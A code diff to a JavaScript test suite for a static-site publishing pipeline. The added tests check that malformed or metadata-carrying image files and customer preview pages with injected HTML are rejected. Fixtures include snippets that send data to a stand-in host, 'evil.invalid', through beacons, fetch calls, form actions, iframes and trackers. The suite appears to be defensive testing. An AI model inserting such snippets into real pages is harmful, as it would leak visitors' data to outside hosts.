@@ -99,6 +99,95 @@ try {
   ]);
   assert.equal((await readFile(path.join(output, customerFolder, "index.html"), "utf8")).includes("PRIVATE"), false);
   assert.deepEqual(await readFile(path.join(output, assetRelative)), png);
+  const assertRejectedImageAsset = async ({ bytes, extension, label, expected }) => {
+    const folder = `invalid-${label}-${createHash("sha256").update(label).digest("hex").slice(0, 8)}`;
+    const digest = createHash("sha256").update(bytes).digest("hex");
+    const relative = `${folder}/assets/${digest}.${extension}`;
+    const url = `https://arcwebhq-cpu.github.io/arc-previews/${relative}`;
+    await put(root, `${folder}/index.html`, customerPreview(folder, { assetUrl: url }));
+    await mkdir(path.dirname(path.join(root, relative)), { recursive: true });
+    await writeFile(path.join(root, relative), bytes);
+    try {
+      await assert.rejects(
+        buildPagesArtifact({ root, output }),
+        expected,
+        `${label} must fail after valid preview proof and content addressing`
+      );
+      assert.deepEqual(
+        await listFiles(output),
+        expectedArtifactFiles,
+        `${label} rejection must preserve the last complete artifact`
+      );
+      assert.deepEqual(
+        await readFile(path.join(output, assetRelative)),
+        png,
+        `${label} rejection must preserve the prior artifact bytes`
+      );
+    } finally {
+      await rm(path.join(root, folder), { recursive: true, force: true });
+    }
+  };
+
+  const crcTable = Array.from({ length: 256 }, (_, value) => {
+    let current = value;
+    for (let bit = 0; bit < 8; bit += 1) current = current & 1 ? 0xedb88320 ^ (current >>> 1) : current >>> 1;
+    return current >>> 0;
+  });
+  const crc32 = bytes => {
+    let value = 0xffffffff;
+    for (const byte of bytes) value = crcTable[(value ^ byte) & 255] ^ (value >>> 8);
+    return (value ^ 0xffffffff) >>> 0;
+  };
+  const pngChunk = (type, content) => {
+    const typeBytes = Buffer.from(type, "ascii");
+    const data = Buffer.from(content);
+    const chunk = Buffer.alloc(12 + data.length);
+    chunk.writeUInt32BE(data.length, 0);
+    typeBytes.copy(chunk, 4);
+    data.copy(chunk, 8);
+    chunk.writeUInt32BE(crc32(Buffer.concat([typeBytes, data])), 8 + data.length);
+    return chunk;
+  };
+  const withPngChunk = (type, content) => Buffer.concat([
+    png.subarray(0, -12),
+    pngChunk(type, content),
+    png.subarray(-12)
+  ]);
+  const webp = Buffer.from("UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEAAUAmJaQAA3AA/v89", "base64");
+  const withWebpChunk = (type, content) => {
+    const data = Buffer.from(content);
+    const chunk = Buffer.alloc(8 + data.length + (data.length & 1));
+    chunk.write(type, 0, 4, "ascii");
+    chunk.writeUInt32LE(data.length, 4);
+    data.copy(chunk, 8);
+    const result = Buffer.concat([webp, chunk]);
+    result.writeUInt32LE(result.length - 8, 4);
+    return result;
+  };
+
+  const jpegShell = Buffer.from([255, 216, 255, 217]);
+  const pngShell = Buffer.concat([png.subarray(0, 8), png.subarray(-12)]);
+  const webpShell = Buffer.alloc(20);
+  webpShell.write("RIFF", 0, 4, "ascii");
+  webpShell.writeUInt32LE(12, 4);
+  webpShell.write("WEBP", 8, 4, "ascii");
+  webpShell.write("VP8 ", 12, 4, "ascii");
+  const corruptPngCrc = Buffer.from(png);
+  corruptPngCrc[29] ^= 1;
+  const dimensionBombPng = Buffer.from(png);
+  dimensionBombPng.writeUInt32BE(12_001, 16);
+  dimensionBombPng.writeUInt32BE(crc32(dimensionBombPng.subarray(12, 29)), 29);
+
+  for (const attack of [
+    { bytes: jpegShell, extension: "jpg", label: "jpeg-shell", expected: /malformed JPEG/ },
+    { bytes: pngShell, extension: "png", label: "png-shell", expected: /malformed PNG/ },
+    { bytes: corruptPngCrc, extension: "png", label: "png-crc", expected: /PNG CRC mismatch/ },
+    { bytes: withPngChunk("tEXt", Buffer.from("Author\0private")), extension: "png", label: "png-text", expected: /embedded PNG metadata/ },
+    { bytes: dimensionBombPng, extension: "png", label: "png-dimensions", expected: /invalid image dimensions/ },
+    { bytes: webpShell, extension: "webp", label: "webp-shell", expected: /malformed WebP/ },
+    { bytes: withWebpChunk("EXIF", Buffer.from("Exif\0\0private")), extension: "webp", label: "webp-exif", expected: /embedded WebP metadata/ }
+  ]) await assertRejectedImageAsset(attack);
+
   await assert.rejects(
     buildPagesArtifact({ root, output: path.join(root, "unsafe-output") }),
     /unsafe source or output directory/
@@ -152,6 +241,32 @@ try {
     await rm(path.join(root, folder), { recursive: true });
   }
 
+  for (const [suffix, injectedSurface] of [
+    ["tracker", '<img src="https://evil.invalid/tracker.png" alt="">'],
+    ["stylesheet", '<link rel="stylesheet" href="https://evil.invalid/styles.css">'],
+    ["iframe", '<iframe src="https://evil.invalid/embed"></iframe>'],
+    ["object", '<object data="https://evil.invalid/payload"></object>'],
+    ["form", '<form action="https://evil.invalid/collect"></form>'],
+    ["refresh", '<meta http-equiv="refresh" content="0;url=https://evil.invalid/next">'],
+    ["css-import", '<style>@import "https://evil.invalid/styles.css";</style>'],
+    ["beacon", '<script>navigator.sendBeacon("https://evil.invalid/collect","x")</script>'],
+    ["fetch", '<script>fetch("https://evil.invalid/data")</script>']
+  ]) {
+    const folder = `remote-${suffix}-abcde${String(300 + suffix.length).slice(-3)}`;
+    await put(root, `${folder}/index.html`, customerPreview(folder, { injectedCheckout: injectedSurface }));
+    await assert.rejects(
+      buildPagesArtifact({ root, output }),
+      /ARC_REMOTE_DEPENDENCY_INVALID|reviewed script manifest changed/,
+      `must reject ${suffix} egress from a proof-valid customer preview`
+    );
+    assert.deepEqual(
+      await listFiles(output),
+      expectedArtifactFiles,
+      `${suffix} rejection must preserve the last complete artifact`
+    );
+    await rm(path.join(root, folder), { recursive: true });
+  }
+
   const mismatchFolder = "mismatch-preview-acde9997";
   await put(root, `${mismatchFolder}/index.html`, customerPreview(mismatchFolder, { proofFolder: "another-preview-acde9996" }));
   await assert.rejects(
@@ -201,7 +316,7 @@ try {
   await writeFile(path.join(root, ...showcaseHero.split("/")), tamperedShowcaseHero);
   await assert.rejects(
     buildPagesArtifact({ root, output }),
-    /asset size, digest, or signature mismatch/
+    /asset size or digest mismatch/
   );
   await writeFile(path.join(root, ...showcaseHero.split("/")), safeShowcaseHero);
 
@@ -237,9 +352,9 @@ assert.equal(
 );
 assert.match(workflow, /deploy-pages:[\s\S]*if: github\.event_name == 'push' && github\.ref == 'refs\/heads\/main'[\s\S]*needs: preview-quality/);
 assert.match(workflow, /run: npm run build:pages/);
-assert.match(workflow, /uses: actions\/upload-pages-artifact@v3[\s\S]*path: \.pages-dist/);
-assert.match(workflow, /uses: actions\/deploy-pages@v4/);
-assert.doesNotMatch(workflow, /uses: actions\/upload-pages-artifact@v3[\s\S]{0,120}path:\s*["']?\.["']?\s*$/m);
+assert.match(workflow, /uses: actions\/upload-pages-artifact@[^\s]+[^\n]*\n[\s\S]*path: \.pages-dist/);
+assert.match(workflow, /uses: actions\/deploy-pages@[^\s]+/);
+assert.doesNotMatch(workflow, /uses: actions\/upload-pages-artifact@[^\s]+[^\n]*\n[\s\S]{0,120}path:\s*["']?\.["']?\s*$/m);
 
 console.log("PASS Pages publish allowlist: only three inert showcases and proof-bound root v10 previews are deployable.");
 console.log("PASS Pages workflow contract: deployment waits for quality and uploads only .pages-dist.");
